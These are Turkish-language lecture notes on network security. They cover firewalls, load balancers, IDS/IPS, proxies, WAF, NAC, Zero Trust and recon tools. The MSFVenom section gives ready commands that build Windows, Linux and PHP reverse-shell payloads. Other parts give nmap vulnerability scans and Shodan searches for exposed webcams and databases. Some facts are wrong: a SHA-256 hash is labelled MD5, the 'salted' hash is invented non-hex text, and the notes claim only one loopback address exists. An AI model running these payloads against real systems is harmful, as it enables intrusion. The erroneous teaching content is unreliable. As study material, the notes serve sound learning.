# Network Güvenliğine Giriş - Detaylı Ders Notları

## Temel Network Kavramları

### IP Adresleri ve Loopback

#### 127.0.0.1 (Loopback)
- **Tanım**: Loopback adresi, bilgisayarın kendisine geri dönen trafiği ifade eder
- **Kullanım**: Yerel test ve geliştirme için kullanılır
- **Özellik**: Sadece tek bir loopback adresi vardır
- **Örnek**: `ping 127.0.0.1` komutu ile yerel ağ kartının çalışıp çalışmadığını test edebilirsiniz

#### 0.0.0.0 vs 127.0.0.1 Farkı
- **0.0.0.0**: Tüm mevcut network interface'lerden gelen trafiği dinler
  - Hem localhost hem de dış network bağlantılarını kabul eder
  - Sunucu uygulamalarında "tüm interface'leri dinle" anlamında kullanılır
- **127.0.0.1**: Sadece loopback interface'i dinler
  - Sadece yerel bağlantıları kabul eder
  - Dış network'ten erişim mümkün değildir

#### Local IP Adresleri
- **192.168.x.x**: Özel IP adresi aralığı
- **10.x.x.x**: Büyük organizasyonlarda kullanılan özel IP aralığı
- **172.16.x.x - 172.31.x.x**: Orta ölçekli network'ler için özel IP aralığı

---

## Güvenlik Duvarları (Firewall)

Firewall, network trafiğini kontrol eden ve güvenlik kurallarına göre filtreleme yapan sistem bileşenidir.

### Firewall Türleri

#### 1. Packet Filtering Firewall
- **Çalışma Prensibi**: Her paketi ayrı ayrı değerlendirir
- **İncelenen Bilgiler**:
  - Kaynak IP adresi
  - Hedef IP adresi
  - Port numaraları
  - Protokol tipi (TCP, UDP, ICMP)
- **Avantajları**: Hızlı ve basit
- **Dezavantajları**: Bağlantı durumunu takip etmez

#### 2. Circuit-Level Gateway (Devre Düzeyli)
- **Çalışma Prensibi**: TCP handshake seviyesinde kontrol yapar
- **Özellikler**:
  - Session kurulumunu doğrular
  - Veri içeriğini incelemez
  - SOCKS proxy protokolü kullanır
- **Kullanım Alanları**: Hızlı bağlantı kontrolü gereken durumlarda

#### 3. Application-Level Gateway (Uygulama Düzeyli)
- **Çalışma Prensibi**: Uygulama katmanında detaylı analiz
- **Özellikler**:
  - İçerik bazlı filtreleme
  - Protokol-spesifik kontroller
  - Deep packet inspection
- **Örnekler**: HTTP proxy, FTP gateway

#### 4. Stateful Inspection Firewall (Durum Bilgili)
- **Çalışma Prensibi**: Bağlantı durumunu takip eder
- **Connection State Table**: Aktif bağlantıları tabloda tutar
- **Avantajları**:
  - Daha güvenli
  - Context-aware filtering
  - Return traffic otomatik olarak izin verilir

#### 5. Next-Generation Firewall (Yeni Nesil)
- **Gelişmiş Özellikler**:
  - Deep Packet Inspection (DPI)
  - Application awareness
  - User identity integration
  - Intrusion Prevention System (IPS) entegrasyonu
  - SSL/TLS decryption
- **Örnek Markalar**: Palo Alto, Fortinet, Check Point

### Firewall Rules (Güvenlik Duvarı Kuralları)

Firewall kuralları, trafiğin nasıl işleneceğini belirleyen politikalardır:

#### Kural Yapısı
```
[Action] [Source] [Destination] [Service] [Time] [Log]
```

#### Action Türleri
- **ALLOW/PERMIT**: Trafiğe izin ver
- **DENY/DROP**: Trafiği sessizce reddet
- **REJECT**: Trafiği reddet ve gönderen tarafa bildir
- **LOG**: Trafiği kaydet

#### Örnek Kurallar
```bash
# SSH trafiğine izin ver
ALLOW 192.168.1.0/24 ANY TCP/22

# HTTP ve HTTPS trafiğine izin ver
ALLOW ANY ANY TCP/80,443

# Tüm giden trafiği reddet
DENY ANY 10.0.0.0/8 ANY

# ICMP ping'e izin ver
ALLOW ANY ANY ICMP/ping
```

---

## Yük Dengeleyiciler (Load Balancer)

### Load Balancer Nedir?
Load Balancer, gelen network trafiğini birden fazla sunucu arasında dağıtarak yük dağılımı sağlayan sistemdir.

### Çalışma Prensibi
1. **İstek Gelir**: Client'tan gelen istekler load balancer'a ulaşır
2. **Sunucu Seçimi**: Algoritma kullanarak uygun sunucu seçilir
3. **İstek İletimi**: İstek seçilen sunucuya iletilir
4. **Yanıt Dönüşü**: Sunucu yanıtı load balancer üzerinden client'a döner

### Load Balancing Algoritmaları

#### 1. Round Robin
- **Çalışma**: İstekler sırayla sunuculara dağıtılır
- **Avantaj**: Basit ve eşit dağılım
- **Dezavantaj**: Sunucu kapasiteleri farklı olabilir

#### 2. Least Connections
- **Çalışma**: En az aktif bağlantısı olan sunucu seçilir
- **Avantaj**: Dinamik yük dağılımı
- **Kullanım**: Uzun süreli bağlantılarda ideal

#### 3. Weighted Round Robin
- **Çalışma**: Sunuculara ağırlık verilerek dağıtım yapılır
- **Avantaj**: Farklı kapasiteli sunucular için uygun

#### 4. IP Hash
- **Çalışma**: Client IP'sine göre hash hesaplanır
- **Avantaj**: Session persistence sağlar

### Health Check
- **Amaç**: Sunucuların sağlık durumunu kontrol etmek
- **Yöntemler**:
  - HTTP health check
  - TCP port check
  - Custom script check
- **Failover**: Arızalı sunucular trafikten çıkarılır

---

## Saldırı Tespit ve Önleme Sistemleri

### IDS (Intrusion Detection System) Nedir?

**Tanım**: Network veya sistem üzerindeki şüpheli aktiviteleri tespit eden güvenlik sistemidir.

#### IDS Özellikleri
- **Pasif Monitoring**: Sadece tespit eder, müdahale etmez
- **Alert Generation**: Şüpheli aktivite durumunda uyarı üretir
- **Log Analysis**: Sistem loglarını analiz eder
- **Pattern Recognition**: Bilinen saldırı kalıplarını tanır

#### IDS Türleri

##### 1. Network-based IDS (NIDS)
- **Konum**: Network segment üzerinde
- **İzleme**: Tüm network trafiği
- **Avantajlar**:
  - Geniş network kapsamı
  - Merkezi yönetim
- **Dezavantajlar**:
  - Şifreli trafiği analiz edemez
  - Yüksek hızlı network'lerde performans sorunu

##### 2. Host-based IDS (HIDS)
- **Konum**: İlgili sunucu/bilgisayar üzerinde
- **İzleme**: Sistem logları, dosya değişiklikleri
- **Avantajlar**:
  - Detaylı sistem analizi
  - Şifreli veri analizi
- **Dezavantajlar**:
  - Her sistem için ayrı kurulum
  - Sistem kaynaklarını kullanır

### IPS (Intrusion Prevention System) Nedir?

**Tanım**: IDS'in gelişmiş versiyonu olup, saldırıları tespit etmenin yanı sıra aktif olarak önleme de yapar.

#### IPS Özellikleri
- **Active Response**: Saldırıları gerçek zamanlı durdurur
- **Inline Deployment**: Trafik yolu üzerinde konumlanır
- **Automatic Blocking**: Otomatik IP engellemesi
- **Signature Updates**: Güncel saldırı imzaları

#### IDS vs IPS Karşılaştırması

| Özellik | IDS | IPS |
|---------|-----|-----|
| **Konum** | Out-of-band (trafik dışında) | Inline (trafik üzerinde) |
| **Tepki** | Pasif (sadece uyarı) | Aktif (engelleme) |
| **Performans Etkisi** | Minimal | Var (latency artışı) |
| **Saldırı Önleme** | Hayır | Evet |
| **False Positive Etkisi** | Sadece uyarı | Trafik kesilir |

---

## Proxy Sunucuları

### Proxy Nedir?
Proxy, client ile server arasında aracılık yapan sunucudur. İstekleri kendi üzerinden ileterek çeşitli güvenlik ve performans faydaları sağlar.

### Proxy Kullanım Alanları

#### 1. Güvenlik (Security)
- **IP Gizleme**: Client'ın gerçek IP adresini gizler
- **Content Filtering**: Zararlı web sitelerini engeller
- **Malware Protection**: Kötü niyetli içerikleri filtreler
- **Access Control**: Kullanıcı bazlı erişim kontrolü

**Örnek Senaryo**: 
```
Client (192.168.1.100) → Proxy (203.0.113.1) → Web Server
Web Server sadece proxy IP'sini görür, client IP'si gizli kalır
```

#### 2. Cache'leme (Caching)
- **Hız Artışı**: Sık erişilen içerikler proxy sunucuda saklanır
- **Bandwidth Tasarrufu**: Aynı içerik tekrar indirilmez
- **Latency Azaltma**: Yerel cache'ten hızlı erişim

**Cache Çalışma Prensibi**:
1. İlk istek: Client → Proxy → Web Server
2. Proxy yanıtı cache'e kaydeder
3. Sonraki istekler: Client → Proxy (cache'ten döner)

#### 3. Çökmeleri Önlemek (Availability)
- **Load Distribution**: Trafiği birden fazla sunucuya dağıtır
- **Failover**: Ana sunucu çöktüğünde yedek sunucuya yönlendirir
- **Circuit Breaker**: Sürekli hata veren servisleri geçici bloklar

#### 4. İnternet Faaliyetlerini Gözlemlemek (Monitoring)
- **Activity Logging**: Tüm web istekleri loglanır
- **User Behavior Analysis**: Kullanıcı davranışları analiz edilir
- **Bandwidth Monitoring**: Trafik kullanımı takip edilir
- **Compliance**: Kurumsal politika uyumluluğu

**Log Örneği**:
```
2024-01-15 10:30:15 user123 192.168.1.50 GET https://example.com 200 OK 1.2MB
2024-01-15 10:30:22 user123 192.168.1.50 POST https://social.com/api/post 403 BLOCKED
```

### Proxy Türleri
- **Forward Proxy**: Client'lar için internet erişimi
- **Reverse Proxy**: Server'lar için yük dağılımı
- **Transparent Proxy**: Client konfigürasyonu gerektirmez
- **Anonymous Proxy**: IP gizleme odaklı

---

## Web Uygulama Güvenlik Duvarı (WAF)

### WAF Nedir?
Web Application Firewall (WAF), web uygulamalarını HTTP/HTTPS saldırılarından koruyan özel güvenlik sistemidir.

### WAF Özellikleri
- **Application Layer Protection**: OSI 7. katman koruması
- **HTTP Protocol Analysis**: HTTP isteklerinin detaylı analizi
- **SQL Injection Prevention**: Veritabanı saldırı koruması
- **XSS Protection**: Cross-site scripting engellemesi
- **DDoS Mitigation**: Uygulama katmanı DDoS koruması

### WAF vs Network Firewall

| Özellik | Network Firewall | WAF |
|---------|------------------|-----|
| **OSI Katmanı** | 3-4 (Network-Transport) | 7 (Application) |
| **İncelenen İçerik** | IP, Port, Protocol | HTTP headers, content, cookies |
| **Saldırı Türleri** | Port scanning, DDoS | SQL injection, XSS, CSRF |
| **Konumlandırma** | Network perimeter | Web server önü |

### WAF Deployment Modları
1. **Bridge Mode**: Network trafiğini geçirir
2. **Reverse Proxy Mode**: Tüm trafiği proxy eder
3. **Cloud-based**: Bulut üzerinde hizmet

---

## Network Erişim Kontrolü (NAC)

### NAC Nedir?
Network Access Control (NAC), network'e bağlanmak isteyen cihazları kimlik doğrulama ve yetkilendirme süreçlerinden geçiren güvenlik sistemidir.

### NAC Bileşenleri
- **Policy Engine**: Erişim politikalarını yönetir
- **Authentication Server**: Kimlik doğrulama yapar
- **Endpoint Assessment**: Cihaz güvenlik durumunu değerlendirir
- **Remediation**: Güvenlik açığı olan cihazları karantinaya alır

### NAC Çalışma Süreçi
1. **Detection**: Yeni cihaz network'e bağlanır
2. **Authentication**: Kullanıcı/cihaz kimlik doğrulama
3. **Authorization**: Erişim yetkilerinin belirlenmesi
4. **Assessment**: Cihazın güvenlik durumu kontrolü
5. **Enforcement**: Politikaların uygulanması

---

## Zero Trust Network Access

### Zero Trust Nedir?
"Hiç kimseye güvenme, her şeyi doğrula" prensibi üzerine kurulu güvenlik modelidir.

### Zero Trust Prensipleri
1. **Verify Explicitly**: Her erişim isteğini doğrula
2. **Least Privilege Access**: Minimum gerekli yetki ver
3. **Assume Breach**: Sistem zaten ele geçirilmiş gibi davran

### ZTNA Bileşenleri
- **Identity Provider**: Kimlik yönetimi
- **Multi-Factor Authentication**: Çok faktörlü doğrulama
- **Device Trust**: Cihaz güvenilirliği
- **Continuous Monitoring**: Sürekli izleme
- **Microsegmentation**: Ağ segmentasyonu

---

## Güvenlik Test Araçları

### MSFVenom

**Tanım**: Metasploit Framework'ün payload üreteci aracıdır.

#### Temel Kullanım
```bash
# Windows reverse shell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Linux payload
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf

# Web payload (PHP)
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.php
```

#### Payload Formatları
- **exe**: Windows executable
- **elf**: Linux executable  
- **war**: Java web application
- **apk**: Android application
- **raw**: Ham shellcode

### Honeypot

**Tanım**: Saldırganları çekmek ve aktivitelerini analiz etmek için kurulan tuzak sistemlerdir.

#### Honeypot Türleri
1. **Low-interaction**: Basit servis simülasyonu
2. **High-interaction**: Tam işletim sistemi simülasyonu
3. **Honeyd**: Virtual honeypot
4. **Dionaea**: Malware yakalama odaklı

#### Honeypot Faydaları
- **Attack Pattern Analysis**: Saldırı kalıplarını öğrenme
- **Early Warning**: Erken uyarı sistemi
- **Threat Intelligence**: Tehdit istihbaratı toplama
- **Forensic Evidence**: Adli tıp kanıtları

---

## Keşif ve İstihbarat Araçları

### OSINT (Open-Source Intelligence)

**Tanım**: Açık kaynaklardan toplanan istihbarat bilgileridir.

#### OSINT Kaynakları
- **Public Records**: Kamu kayıtları
- **Social Media**: Sosyal medya platformları
- **News Sources**: Haber kaynakları
- **Academic Papers**: Akademik yayınlar
- **Technical Documentation**: Teknik dökümanlar

#### OSINT Araçları
- **theHarvester**: E-mail ve subdomain bulma
- **Maltego**: Görsel istihbarat analizi
- **Shodan/Censys**: İnternet cihaz taraması
- **Wayback Machine**: Web sitesi geçmişi

### Shodan

**Tanım**: İnternet'e bağlı cihazları tarayan arama motorudur.

#### Shodan Özellikleri
- **IoT Device Discovery**: IoT cihazlarını keşfetme
- **Banner Grabbing**: Servis banner bilgileri
- **Vulnerability Search**: Bilinen güvenlik açıkları
- **Geographical Mapping**: Coğrafi konum bilgisi

#### Shodan Arama Örnekleri
```bash
# Apache sunucuları
apache

# Belirli ülkede webcam'ler  
webcam country:"TR"

# Açık MongoDB veritabanları
"MongoDB Server Information" port:27017

# IIS sunucuları
"Microsoft-IIS"
```

### Censys

**Tanım**: İnternet altyapısını sistematik olarak tarayan araştırma platformudur.

#### Censys vs Shodan
- **Censys**: Daha detaylı SSL/TLS analizi
- **Shodan**: Daha geniş IoT cihaz veritabanı
- **Censys**: Akademik araştırma odaklı
- **Shodan**: Güvenlik testi odaklı

---

## Network Analiz Araçları

### Nmap (Network Mapper)

**Tanım**: Network keşfi ve güvenlik taraması yapan güçlü bir araçtır.

#### Temel Nmap Kullanımı

```bash
# Temel port taraması
nmap 192.168.1.1

# Servislerin versiyonlarını öğren
nmap -sV 192.168.1.1

# İşletim sistemi tespiti
nmap -O 192.168.1.1

# UDP port taraması
nmap -sU 192.168.1.1

# Stealth SYN tarama
nmap -sS 192.168.1.1

# Tüm portları tara
nmap -p- 192.168.1.1

# Belirli port aralığı
nmap -p 1-1000 192.168.1.1
```

#### Gelişmiş Nmap Komutları

```bash
# Ping taraması yapmadan port tara
nmap -Pn 192.168.1.1

# Verbose çıktı ile detaylı bilgi
nmap -v 192.168.1.1

# Güvenlik açığı taraması
nmap --script=vuln 192.168.1.1

# NSE script'ler ile tarama
nmap --script=default 192.168.1.1

# Kombine tarama (servis + güvenlik açığı)
sudo nmap -Pn -sV -v --script=vuln 192.168.1.100
```

#### Nmap Çıktı Formatları
```bash
# Normal çıktı
nmap -oN output.txt target

# XML çıktı
nmap -oX output.xml target  

# Grepable çıktı
nmap -oG output.grep target

# Tüm formatlar
nmap -oA output target
```

### OS Detection Alternatifleri

Nmap ile OS öğrenemediğimiz durumlarda alternatif yöntemler:

#### 1. Banner Grabbing
```bash
# HTTP banner
curl -I http://target.com

# SSH banner  
ssh target.com

# Telnet ile port banner
telnet target.com 80
```

#### 2. TTL (Time To Live) Analizi
```bash
# Ping ile TTL değeri
ping -c 1 target.com

# Farklı OS'ların TTL değerleri:
# Windows: 128
# Linux: 64  
# Mac: 64
# Cisco: 255
```

#### 3. TCP Window Size
```bash
# Hping3 ile window size tespiti
hping3 -S -p 80 -c 1 target.com
```

### Wayback Machine

**Tanım**: Web sitelerinin geçmiş versiyonlarını arşivleyen platform.

#### Kullanım Alanları
- **Historical Analysis**: Geçmiş içerik analizi
- **Deleted Content**: Silinmiş sayfa recovery
- **Technology Evolution**: Teknoloji değişim takibi
- **OSINT Research**: İstihbarat araştırması

### TCPView / TCPDump

#### TCPView (Windows)
- **GUI araç**: Grafik arayüzlü network monitoring
- **Real-time**: Gerçek zamanlı bağlantı görüntüleme
- **Process Mapping**: Hangi process'in hangi bağlantıyı kullandığını gösterir

#### TCPDump (Linux/Unix)
```bash
# Temel network trafiği dinleme
tcpdump

# Belirli interface dinleme
tcpdump -i eth0

# Port bazlı filtreleme
tcpdump port 80

# Host bazlı filtreleme
tcpdump host 192.168.1.1

# Paket içeriğini görüntüleme
tcpdump -X port 80

# Dosyaya kaydetme
tcpdump -w capture.pcap
```

---

## Saldırı Teknikleri

### Brute-Force Saldırıları

**Tanım**: Şifre veya kimlik bilgilerini deneme-yanılma yöntemiyle kırma tekniğidir.

#### Brute-Force Türleri
1. **Dictionary Attack**: Yaygın şifre listesi kullanma
2. **Hybrid Attack**: Sözlük + karakter kombinasyonu
3. **Pure Brute-Force**: Tüm kombinasyonları deneme
4. **Credential Stuffing**: Sızan veri listelerini kullanma

#### Korunma Yöntemleri
- **Account Lockout**: Başarısız girişimde hesap kilitleme
- **CAPTCHA**: İnsan doğrulama sistemi
- **Rate Limiting**: İstek hızı sınırlaması
- **Multi-Factor Authentication**: Çok faktörlü doğrulama

### Rainbow Tables

**Tanım**: Hash değerlerinin önceden hesaplanmış tablolarıdır.

#### Rainbow Table Avantajları
- **Hız**: Hash kırma işlemini hızlandırır
- **Efficiency**: CPU gücü yerine depolama alanı kullanır
- **Success Rate**: Yaygın şifrelerde yüksek başarı oranı

#### Rainbow Table Korunması
- **Salt Usage**: Hash'lere salt ekleme
- **Strong Hashing**: bcrypt, scrypt, Argon2 kullanımı
- **Key Stretching**: Çoklu hash işlemi

**Salt Örneği**:
```
Normal MD5: password → 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
Salt'lı MD5: password + abc123 → 3a8e2f6b4c9d1e0f7g8h9i0j1k2l3m4n5o6p7q8r9s
```

---

## HTTP Headers

### User-Agent Nedir?

**Tanım**: Client'ın (tarayıcı, uygulama) kendisini server'a tanıttığı HTTP header'ıdır.

#### User-Agent Örneği
```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
```

#### User-Agent Bilgileri
- **Browser Type**: Tarayıcı türü (Chrome, Firefox, Safari)
- **Version**: Tarayıcı versiyonu
- **Operating System**: İşletim sistemi
- **Device Type**: Masaüstü, mobil, tablet

#### User-Agent Spoofing
```bash
# cURL ile User-Agent değiştirme
curl -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)" http://example.com

# Python requests
headers = {'User-Agent': 'Custom Bot 1.0'}
response = requests.get('http://example.com', headers=headers)
```

### Referrer Nedir?

**Tanım**: Kullanıcının hangi sayfadan geldiğini belirten HTTP header'ıdır.

#### Referer Header Örneği
```http
Referer: https://www.google.com/search?q=example
```

#### Referrer Policy
```html
<!-- Meta tag ile kontrol -->
<meta name="referrer" content="no-referrer">

<!-- HTTP header ile -->
Referrer-Policy: strict-origin-when-cross-origin
```

#### Privacy Implications
- **User Tracking**: Kullanıcı takibi için kullanılabilir
- **Information Leakage**: Hassas URL parametreleri sızabilir
- **Analytics**: Web sitesi trafiği analizi
